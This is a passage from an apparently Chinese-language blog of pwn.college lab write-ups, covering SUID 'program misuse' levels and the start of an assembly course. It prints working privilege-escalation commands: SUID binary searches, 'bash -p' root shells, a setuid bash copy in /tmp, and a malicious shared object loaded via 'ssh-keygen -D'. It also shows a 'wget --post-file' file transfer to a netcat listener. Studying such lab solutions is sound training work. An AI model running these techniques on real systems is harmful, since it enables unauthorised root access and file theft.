class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="level-141"><a class="markdownIt-Anchor" href="#level-141"></a> level 141</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<span class="hljs-number">1418</span>)  <span class="hljs-comment">#当客户端尝试连接到 0.0.0.0 时，它通常表示客户端将尝试连接到本地网络中的所有可用服务器。这里127.0.0.1也可以</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="level-142"><a class="markdownIt-Anchor" href="#level-142"></a> level 142</h2>
<p>​	这里代码仿照 level 140，但是套接字的代码也需要函数 <code>pwncollege</code></p>
<h1 id="program-misuse"><a class="markdownIt-Anchor" href="#program-misuse"></a> Program Misuse</h1>
<blockquote>
<p>相关介绍:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/limingluzhu/p/5702486.html">Linux内核学习笔记： uid之ruid，euid，suid</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/sh -p # 这将会保存权限，他就是提权指令，得到一个新的shell(提权成功就是root了)<br><span class="hljs-meta prompt_"># </span><span class="language-bash">以下命令将尝试查找具有 root 权限的 SUID 的文件，不同系统适用于不同的命令</span><br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000-print 2&gt;/dev/null<br>find / -user root -perm -4000-exec ls -ldb &#123;&#125; ;<br>find / -type f -perm -04000 -ls 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
<h2 id="level-11-2"><a class="markdownIt-Anchor" href="#level-11-2"></a> level 11</h2>
<ul>
<li><code>od -w100 -c /flag | sed ‘s# ##g’</code>
<ul>
<li>这里的 <code>-w100</code> 指每行显示100个字节，<code>-c</code> 以字符形式显示sed工具可以进行文本替换，<code>s</code> 表示替换，<code>#</code> 是分隔符，<code>##</code> 表示要替换的内容为空字符串，<code>g</code> 表示全局替换，即一行中的所有匹配都替换。</li>
<li>这里注意管道符的作用，它将前面的输出作为后面的输出，进行更改之后再向shell中输出</li>
</ul>
</li>
</ul>
<h2 id="level-12"><a class="markdownIt-Anchor" href="#level-12"></a> level 12</h2>
<ul>
<li>
<p><code>hexdump -C /flag | awk -F &quot;|&quot; '&#123;print $2&#125;' | xargs | sed &quot;s# ##g&quot;</code></p>
<ul>
<li><code>awk -F &quot;|&quot; '&#123;print $2&#125;'</code> ，awk用于处理上一个语句的输出，使用 <code>“|”</code> 作为字段分隔符，并打印第二个字段，这里就是按照 | 把每行分成了3份。这里就是把两个 | 中的语句提取出来打印</li>
<li><code>xargs</code> 构建并执行来自标准输入的命令行，就是从标准输入中得到数据。这里就是获取<code>awk</code> 的数据，将其作为参数传递给下一个命令 —&gt; <a target="_blank" rel="noopener" href="https://www.notion.so/Linux-5f53968518a54ccbb605d10a1b177e3a?pvs=21">注意它与管道符的区别</a></li>
<li><code>sed &quot;s# ##g&quot;</code> 全局替换空格为无，这里首先使用 <code>xargs</code> 把内容输入到 <code>sed</code> 中，之后再进行处理</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@program-misuse-level-12:/challenge$ hexdump -C /flag <br>00000000  70 77 6e 2e 63 6f 6c 6c  65 67 65 7b 63 44 64 55  |pwn.college&#123;cDdU|<br>00000010  48 34 43 66 4d 76 4a 6a  45 44 5a 6f 55 32 79 56  |H4CfMvJjEDZoU2yV|<br>00000020  61 41 5a 6d 6c 37 57 2e  30 46 4e 31 45 44 4c 30  |aAZml7W.0FN1EDL0|<br>00000030  63 44 4d 7a 51 7a 57 7d  0a                       |cDMzQzW&#125;.|<br>00000039<br><br>hacker@program-misuse-level-12:/challenge$ hexdump -C /flag | awk -F<span class="hljs-string">&quot;|&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> <br>pwn.college&#123;cDdU<br>H4CfMvJjEDZoU2yV<br>aAZml7W.0FN1EDL0<br>cDMzQzW&#125;.<br><br>hacker@program-misuse-level-12:/challenge$ hexdump -C /flag | awk -F<span class="hljs-string">&quot;|&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs | sed <span class="hljs-string">&quot;s# ##g&quot;</span><br>pwn.college&#123;cDdUH4CfMvJjEDZoU2yVaAZml7W.0FN1EDL0cDMzQzW&#125;.<br></code></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="level-13"><a class="markdownIt-Anchor" href="#level-13"></a> level 13</h2>
<ul>
<li>
<p><code>echo $(xxd -p /flag) | xxd -r -p</code> —&gt; <code>xxd -p /flag | xxd -r -p</code></p>
<ul>
<li>使用<code>xxd -p /flag</code>生成连续的十六进制输出。<code>xxd</code>是一个将二进制文件转换为十六进制表示的工具，<code>-p</code>选项使其生成连续的十六进制输出</li>
<li>使用<code>echo</code>将输出传递给下一个命令。这里<code>echo $&#123; &#125;</code>da会先处理 <code>&#123; &#125;</code>，并将其结果输出出来 。</li>
<li>使用<code>xxd -r -p</code>将十六进制转换为ASCII。<code>xxd -r -p</code>会将十六进制字符串转换回原始的二进制数据。这里的二进制数据实际上只包含了ASCII字符的字节，那么转化后就会得到ascii字符</li>
<li>之后进行实验，不适用 <code>echo</code> 也可以</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@program-misuse-level-13:/challenge$ xxd /flag<br>00000000: 7077 6e2e 636f 6c6c 6567 657b 7761 6f39  pwn.college&#123;wao9<br>00000010: 4d74 386a 6d36 7342 6c30 7644 4338 7672  Mt8jm6sBl0vDC8vr<br>00000020: 6374 4a49 4a6f 332e 3056 4e31 4544 4c30  ctJIJo3.0VN1EDL0<br>00000030: 6344 4d7a 517a 577d 0a                   cDMzQzW&#125;.<br><br>hacker@program-misuse-level-13:/challenge$ xxd -p /flag<br>70776e2e636f6c6c6567657b77616f394d74386a6d3673426c3076444338<br>767263744a494a6f332e30564e3145444c3063444d7a517a577d0a<br><br>hacker@program-misuse-level-13:/challenge$ <span class="hljs-built_in">echo</span> $(xxd -p /flag)<br>70776e2e636f6c6c6567657b77616f394d74386a6d3673426c3076444338 767263744a494a6f332e30564e3145444c3063444d7a517a577d0a<br><br>hacker@program-misuse-level-13:/challenge$ <span class="hljs-built_in">echo</span> $(xxd -p /flag) | xxd -r -p<br>pwn.college&#123;wao9Mt8jm6sBl0vDC8vrctJIJo3.0VN1EDL0cDMzQzW&#125;<br><br>hacker@program-misuse-level-13:/challenge$ xxd -p /flag | xxd -r -p<br>pwn.college&#123;wao9Mt8jm6sBl0vDC8vrctJIJo3.0VN1EDL0cDMzQzW&#125;<br></code></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="level-19"><a class="markdownIt-Anchor" href="#level-19"></a> level 19</h2>
<ul>
<li><code>zip tmp.zip /flag; unzip -p tmp.zip</code>
<ul>
<li><code>zip tmp.zip /flag</code> 将 <code>/flag</code> 压缩到 <code>tmp.zip</code> 文件中</li>
<li><code>unzip -p tmp.zip</code> 解压缩并标准输出</li>
</ul>
</li>
</ul>
<h2 id="level-20"><a class="markdownIt-Anchor" href="#level-20"></a> level 20</h2>
<ul>
<li><code>tar xf /flag -I '/bin/sh -c &quot;cat 1&gt;&amp;2&quot;'</code></li>
<li>或者 <code>tar cf  flag.tar /flag; tar -Oxf /flag.tar</code></li>
</ul>
<h2 id="level-24-31"><a class="markdownIt-Anchor" href="#level-24-31"></a> level 24-31</h2>
<p>​	这个区间的题都可以看下面的网站 <code>GTFOBins</code> ，它里面包含操作具有SUID位的命令进入root shell的指令，直接运行就可以了。这里是对于每个命令的<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/321219.html">分析</a>。</p>
<h2 id="level-32-2"><a class="markdownIt-Anchor" href="#level-32-2"></a> level 32</h2>
<blockquote>
<p>socat的使用</p>
</blockquote>
<ul>
<li><code>socat -u &quot;file:/flag&quot; -</code> / <code>socat - /flag</code>
<ul>
<li><code>-u</code>: 表示无缓存模式，在这个模式下，数据将立即传递而无需等待缓冲区填满</li>
<li><code>&quot;file:/flag&quot;</code>: 这是 socat 的源地址，指定了要连接的文件路径。在这里，<code>/flag</code> 是文件路径。</li>
<li><code>-</code>: 这是 socat 的目标地址，表示将数据发送到标准输出(stdout)</li>
<li>这个命令的作用是将文件 <code>/flag</code> 的内容通过无缓冲模式输出到标准输出</li>
</ul>
</li>
</ul>
<h2 id="level-33"><a class="markdownIt-Anchor" href="#level-33"></a> level 33</h2>
<blockquote>
<p>whiptail 是一个在 shell 脚本中创建对话框的工具，它通常用于创建用户友好的文本界面</p>
</blockquote>
<ul>
<li><code>whiptail --textbox &quot;/flag&quot; 20 60</code>
<ul>
<li><code>whiptail</code> 用于在 shell 脚本中创建对话框</li>
<li><code>--textbox &quot;/flag&quot;</code>: 指定要在对话框中显示的文件路径为 “/flag”。<code>--textbox</code> 选项告诉 <code>whiptail</code> 显示文件内容。</li>
<li><code>20 60</code>: 这两个参数分别指定了对话框的高度和宽度。在这里，高度为20行，宽度为60列。</li>
</ul>
</li>
</ul>
<h2 id="level-34"><a class="markdownIt-Anchor" href="#level-34"></a> level 34</h2>
<p>​	<code>awk</code> 主要用于从文本文件或数据流中提取和处理数据。它的工作原理是基于模式匹配和动作的规则。用户可以指定一组模式(类似于正则表达式)，当这些模式匹配输入行时，相应的动作将被执行。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">pattern是模式，用于匹配输入数据的行，&#123;action&#125;是与模式匹配的行要执行的动作</span><br>awk &#x27;pattern &#123; action &#125;&#x27; file<br><span class="hljs-meta prompt_"># </span><span class="language-bash">打印文件中包含关键字<span class="hljs-string">&quot;error&quot;</span>的行</span><br>awk &#x27;/error/ &#123; print &#125;&#x27; logfile.txt<br></code></pre></td></tr></table></figure>
<ul>
<li><code>awk '&#123;print&#125;' /flag</code></li>
</ul>
<h2 id="level-35"><a class="markdownIt-Anchor" href="#level-35"></a> level 35</h2>
<p>​	<code>sed</code>(Stream Editor)是一个用于对文本进行流式编辑的工具，它可以读取文件内容并对其进行各种文本转换操作。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">打印文件内容</span><br>sed &#x27;p&#x27; filename.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash">替换文本，将old替换为new，/g表示为全局。补充：在vim中，可以使用 :%s/old/new/g来进行替换</span><br>sed &#x27;s/old-text/new-text/g&#x27; filename.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash">这里就是直接省略标签，然后跳转到末尾，这样就全部显示出标准输出了</span><br>sed b -&gt; b label  Branch to label; if label is omitted, branch to end of script.<br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除行</span><br>sed &#x27;/pattern/d&#x27; filename.txt<br></code></pre></td></tr></table></figure>
<ul>
<li><code>sed 'p' /flag</code></li>
</ul>
<h2 id="level-36"><a class="markdownIt-Anchor" href="#level-36"></a> level 36</h2>
<p>​	<code>ed</code> 是一个文本编辑器，它以交互方式在终端中工作。类似于 vim，不过规则与显示不同</p>
<ul>
<li><code>ed /flag</code> 之后再输入 <code>1,$p</code> 打印整个文件的内容，<code>p</code> 打印当前行的内容。之后按 <code>q</code> 退出。</li>
</ul>
<h2 id="level-37"><a class="markdownIt-Anchor" href="#level-37"></a> level 37</h2>
<p>​	<code>chown</code> 命令改变某个文件或目录的所有者和所属的组，该命令可以向某个用户授权，使该用户变成指定文件的所有者或者改变文件所属的组。用户可以是用户或者是用户D，用户组可以是组名或组id。文件名可以使由空格分开的文件列表，在文件名中可以包含通配符。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@program-misuse~level37:~$ chown -c hacker /flag<br>changed ownership of &#x27;/flag&#x27; from root to hacker<br></code></pre></td></tr></table></figure>
<h2 id="level-38"><a class="markdownIt-Anchor" href="#level-38"></a> level 38</h2>
<p>​	<code>chmod </code>命令可以通过符号组合的方式更改目标文件或目录的权限。通过八进制数的方式更改目标文件或目录的权限。通过参考文件的权限来更改目标文件或目录的权限。这里直接赋予 777 权限。</p>
<h2 id="level-39"><a class="markdownIt-Anchor" href="#level-39"></a> level 39</h2>
<ul>
<li><code>cp /flag /dev/stdout</code>
<ul>
<li><code>/dev/stdout</code> 是一个特殊的文件路径，代表标准输出(stdout)设备。如果将输出写入 <code>/dev/stdout</code>，效果与直接在终端上显示输出相同。</li>
</ul>
</li>
</ul>
<h2 id="level-40"><a class="markdownIt-Anchor" href="#level-40"></a> level 40</h2>
<blockquote>
<p>这里有点歪门邪道，记住challenge给与suid权限，但是它是赋予该名称权限而不检查它的二进制文件内容</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@program-misuse~level40:~$ mv /flag /usr/bin/mv  #这里就是用/flag的内容替换了mv的二进制文件<br>hacker@program-misuse~level40:~$ /challenge/babysuid_level40 #它赋予权限也是赋予相应名称文件，不检查文件到底是什么<br>Welcome to /challenge/babysuid_level40!<br><br>This challenge is part of a series of programs that<br>let you get the flag by doing tricks with permissions.<br><br>I just set the SUID bit on /usr/bin/mv.<br>Try to use it to read the flag!<br><br>IMPORTANT: make sure to run me (/challenge/babysuid_level40) every time that you restart<br>this challenge container to make sure that I set the SUID bit on /usr/bin/mv!<br>hacker@program-misuse~level40:~$ cat /usr/bin/mv<br></code></pre></td></tr></table></figure>
<h2 id="level-41-2"><a class="markdownIt-Anchor" href="#level-41-2"></a> level 41</h2>
<p>​	<code>Perl</code> 命令行工具通常用于执行一行Perl代码，而不需要编写完整的Perl脚本。</p>
<ul>
<li><code>perl -ne 'print if /pwn/' /flag</code></li>
</ul>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">perl -<span class="hljs-keyword">ne</span> &#x27;<span class="hljs-keyword">print</span> <span class="hljs-keyword">if</span> /pattern/&#x27; filename.txt<br><span class="hljs-meta"># -e 允许在命令行中直接提供perl代码</span><br><span class="hljs-meta"># -n 使Perl在每行上执行给定的代码，这里的代码是打印包含指定模式的行。</span><br></code></pre></td></tr></table></figure>
<h2 id="level-42"><a class="markdownIt-Anchor" href="#level-42"></a> level 42</h2>
<blockquote>
<p>执行python代码即可</p>
</blockquote>
<ul>
<li><code> python -c 'print(open(&quot;/flag&quot;).read())'</code></li>
</ul>
<h2 id="level-43"><a class="markdownIt-Anchor" href="#level-43"></a> level 43</h2>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@program-misuse~level43:~$ ruby -e &#x27;puts File.read(&quot;/flag&quot;)&#x27;<br>Traceback (most recent call last):<br>ruby: no -e allowed while running setuid (SecurityError)#这里是ruby具有suid，然后为了保护不让用-e来执行，所以需要单独写一个脚本来执行命令<br>hacker@program-misuse~level43:~$ echo &#x27;puts File.read(&quot;/flag&quot;)&#x27; &gt; a.rb<br>hacker@program-misuse~level43:~$ ruby a.rb<br></code></pre></td></tr></table></figure>
<h2 id="level-44-2"><a class="markdownIt-Anchor" href="#level-44-2"></a> level 44</h2>
<ul>
<li><code>bash -p</code> 提权然后为root权限</li>
</ul>
<h2 id="level-45"><a class="markdownIt-Anchor" href="#level-45"></a> level 45</h2>
<p>​	<code>date</code> 原来的作用是显示当前时间或者将时间按格式输出，但是用<code>-f</code>可以读取文件，如果文件内容不是正常的日期，则会回显出来。</p>
<ul>
<li><code>date -f /flag</code></li>
</ul>
<h2 id="level-46"><a class="markdownIt-Anchor" href="#level-46"></a> level 46</h2>
<p>​	<code>dmesg</code> 被用于检查和控制内核的环形缓冲区。kernel会将开机信息存储在ring buffer中。若是开机时来不及查看信息，可利用dmesg来查看。开机信息保存在 /var/log/dmesg 文件里。</p>
<ul>
<li><code>dmesg -F /flag</code></li>
</ul>
<h2 id="level-47"><a class="markdownIt-Anchor" href="#level-47"></a> level 47</h2>
<p>​	<code>wc</code> 原作用是统计文件的字节数、字数、行数。但是通过<code>--files0-from</code>参数可以从文件中读取文件名，所以如果文件内容不是一个正常的文件名的话就会回显出来</p>
<ul>
<li><code>wc --files0-from=/flag</code></li>
</ul>
<h2 id="level-48-2"><a class="markdownIt-Anchor" href="#level-48-2"></a> level 48</h2>
<ul>
<li>
<p><code>gcc -x c -E /flag</code></p>
<ul>
<li><code>-x c</code>: 指定输入文件的语言为C语言。这是为了确保 <code>gcc</code> 正确地识别输入文件 <code>/flag</code> 的语言类型。<code>-x</code> 选项后跟语言名称，这里是 “c”。</li>
<li><code>-E</code>: 该选项告诉编译器只进行预处理而不进行编译、汇编和链接。预处理是一个处理源代码的阶段，它包括宏展开、文件包含等操作，生成的结果通常是一个纯文本的C源代码，而不是编译后的目标文件。</li>
</ul>
</li>
<li>
<p><code>gcc -x assembler /flag</code></p>
<ul>
<li>这个以汇编形式报错展示，这里assembler也可以换成c，也会以报错显示出来文件内容</li>
</ul>
</li>
</ul>
<h2 id="level-49"><a class="markdownIt-Anchor" href="#level-49"></a> level 49</h2>
<p>​	<code>as</code> 是GNU组织推出的一款汇编语言编译器，它支持多种不同类型的处理器。报错会回显问文件信息。</p>
<ul>
<li><code>as /flag</code> 这里 <code>as @/flag</code>可以去除一些杂乱信息</li>
</ul>
<h2 id="level-50"><a class="markdownIt-Anchor" href="#level-50"></a> level 50</h2>
<ul>
<li><code>nc -lp 8888 &amp; wget -bv --post-file=/flag http://127.0.0.1:8888</code>
<ul>
<li><code>nc -lp 8888 &amp;</code>: 启动一个在本地监听端口 <code>8888</code> 上的 netcat 服务。<code>-l</code> 表示监听模式，<code>-p 8888</code> 指定端口号为 <code>8888</code>，<code>&amp;</code> 表示将命令放到后台运行。</li>
<li><code>wget -bv --post-file=/flag http://127.0.0.1:8888</code>: 使用 <code>wget</code> 命令向指定的地址发送一个 POST 请求，将 <code>/flag</code> 文件的内容作为 POST 数据发送给 <code>http://127.0.0.1:8888</code>。这里 b 指后台运行，v指展示详细信息，这两个都可以不加。</li>
</ul>
</li>
<li>这里就是通过wget将flag通过网络传输到本机的一个端口，然后使用nc来将接收到的数据输出到标准输出中</li>
</ul>
<h2 id="level-51"><a class="markdownIt-Anchor" href="#level-51"></a> level 51</h2>
<blockquote>
<p>这里利用的就是suid提权之so文件注入</p>
</blockquote>
<h3 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h3>
<p>​	原理：某些程序运行时候，有着管理员权限，却可以被任何用户调用，这就是suid权限。如果这个suid程序调用了某些shared object，可以通过伪造shared object，来伪造命令。以该程序的root权限，去执行提权命令。<br />
<code>cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p</code>。注意，suid权限必须是二进制程序才能用，脚本程序是无效的。</p>
<ol>
<li>
<p><code>ssh-keygen</code> 可以使用 -D 参数直接运行任意的共享库。如果有suid的话就能运行我们的恶意代码造成提权，共享库的创建方式见下方</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh-keygen -D ./file.s0<br></code></pre></td></tr></table></figure>
</li>
<li>
<p><code>gcc</code> 可以通过 <code>-shared</code> 参数来创建共享库，共享库不能单独运行，它相当于一个必须被别人调用才能运行的程序，它与普通二进制程序的区别可以通过file命令来查看，共享库没有<code>interpreter</code>这样的字段，也就是没有链接解释器。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc file.c -shared -o file.so<br></code></pre></td></tr></table></figure>
</li>
<li>
<p><code>ldd</code> 用于打印程序或者库文件所依赖的共享库列表。我们可以利用它来查看是否有可操作的os共享库，注入我们的代码。另一种方法就是利用 <code>strace</code> 来查看程序运行全过程，然后使用grep来过滤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ldd /usr/bin/ssh-keygen<br>strace /usr/bin/ssh-keygen 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;<br></code></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="wp"><a class="markdownIt-Anchor" href="#wp"></a> wp</h3>
<p>​	编写c脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-comment">// 设置c语言的attribute属性来使函数在程序预处理阶段运行</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">()</span> __<span class="hljs-title function_">attribute__</span><span class="hljs-params">((constructor))</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">C_GetFunctionList</span><span class="hljs-params">()</span>&#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;euid:%d\n&quot;</span>,geteuid()); <span class="hljs-comment">// 这里注意是geteuid，有效用户ID euid才是执行时真正有效的权限，uid获取的是实际用户ID ruid。这两者一般等同，但是在设置了suid之后会有不同，所以这里需要的是实际用户ID</span><br>	sendfile(<span class="hljs-number">1</span>,open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>),<span class="hljs-number">0</span>,<span class="hljs-number">4096</span>); <span class="hljs-comment">// 它打开文件，然后将内容发送给标准输出显示</span><br>    <br>    <span class="hljs-comment">//这里在使用euid=0的权限时不要使用system()函数来运行shell代码，不然会以当前uid权限(ruid)来执行shell代码。这样就不能达到提权的效果</span><br>	<span class="hljs-comment">//system(&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&quot;);</span><br>	<span class="hljs-type">char</span> *argvv[]=&#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-p&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>	execvp(<span class="hljs-string">&quot;/bin/bash&quot;</span>,argvv);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>​	执行命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc a.c -shared -o file.so<br>ssh-keygen -D ./file.so<br></code></pre></td></tr></table></figure>
<h1 id="assembly-crash-course"><a class="markdownIt-Anchor" href="#assembly-crash-course"></a> Assembly Crash Course</h1>
<h2 id="基础知识-2"><a class="markdownIt-Anchor" href="#基础知识-2"></a> 基础知识</h2>
<h3 id="命令行方式"><a class="markdownIt-Anchor" href="#命令行方式"></a> 命令行方式</h3>
<ol>
<li>
<p>gcc编译链接。gcc除了可以编译链接c语言后，还可以直接编译链接汇编代码。如果用汇编代码，一般是用不到std库和os共享库的，可以用 <strong>-nostdlib</strong> 和 <strong>-static</strong> 参数来处理，如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -nostdlib -static exit.s -o exit.elf  # .elf可以不加<br></code></pre></td></tr></table></figure>
<p>这样就能避免导入std库，也不用有main函数，同时采用静态链接的当时不会再引用动态库</p>
</li>
<li>
<p>strace 显示执行过程。这里使用strace来运行程序，会显示程序进行的每一个步骤。这里就发现，最简单的c程序也需要大量使用到动态链接库，而这里题目要求编写最为简单的汇编代码，就是不让使用动态链接。所以这里就是可以使用 strace 来查看程序的情况，以便解决问题。</p>
</li>
<li>
<p>objdump 显示二进制程序的所有模块(hd file可以以十六进制查看文件内容)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">objdump -M intel -d exit.elf<br><span class="hljs-meta prompt_"># </span><span class="language-bash">-M 指定指令集格式</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-d 反汇编全部</span><br></code></pre></td></tr></table></figure>
</li>
<li>
<p>objcopy 提取二进制程序模块，它可以将二进制程序中的模块汇编代码单独提取出来，转化为字节码存储</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">objcopy --dump-section .text=exit.bin exit.elf<br><span class="hljs-meta prompt_"># </span><span class="language-bash">--dump-section .text=exit.bin 指从输入文件中把.text节的内容提取出来保存到exit.bin中</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">exit.elf 是输入文件</span><br></code></pre></td></tr></table></figure>
</li>
<li>
<p>标准文件头，下面是汇编代码的指定需要包含的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.global _start        	; 定义_start为全局标签，它是程序的入口<br>.intel_syntax noprefix 	; 切换到Intel语法，noprefix表示不适用前缀(不使用%作为寄存器的前缀)<br>_start:					; 程序的起始点<br></code></pre></td></tr></table></figure>
</li>
<li>
<p>这里命令行方式的话提取的二进制会多一个0x48，反汇编之后是<strong>dec eax</strong>的意思，不过好像并没有被当做命令来显示。</p>
</li>
</ol>
<h3 id="python方式"><a class="markdownIt-Anchor" href="#python方式"></a> python方式</h3>
<p>​	这里同时还可以使用pwntools来达到目的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br><br>r = process([<span class="hljs-string">&quot;/challenge/run&quot;</span>])<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rdi,0x1337</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = asm(shellcode, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>)  <span class="hljs-comment"># asm将汇编语言字符串转换为二进制代码</span><br>log.success(<span class="hljs-built_in">str</span>(payload))<br><br>r.send(payload)  <span class="hljs-comment"># 向子进程发送二进制代码，和上面操作一样</span><br><span class="hljs-comment"># r.interactive()  # 这个也行，与下面的操作是等价的</span><br>text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>    log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>
<h2 id="level-1-2"><a class="markdownIt-Anchor" href="#level-1-2"></a> level 1</h2>
<blockquote>
<p>简单编写一下汇编代码</p>
</blockquote>
<p>​	编写d.s的汇编文件</p>
